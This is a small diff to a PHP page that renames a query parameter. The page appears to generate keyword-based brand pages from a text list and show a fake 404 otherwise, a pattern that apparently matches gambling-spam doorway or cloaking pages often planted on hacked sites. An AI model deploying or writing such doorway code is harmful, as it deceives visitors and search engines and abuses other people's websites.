@@ -6,10 +6,10 @@ function feedback404()
     echo "<h1>Page not found/h1>";
 }
 
-if (isset($_GET['gacor'])) {
+if (isset($_GET['tobrut'])) {
     $filename = "kay.txt";
     $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-    $target_string = strtolower($_GET['gacor']);
+    $target_string = strtolower($_GET['tobrut']);
     foreach ($lines as $item) {
         if (strtolower($item) === $target_string) {
             $BRAND = strtoupper($target_string);
@@ -4072,5 +4072,3 @@ window.onload = function() {
 </script>
 </body>
 </html>
-
-
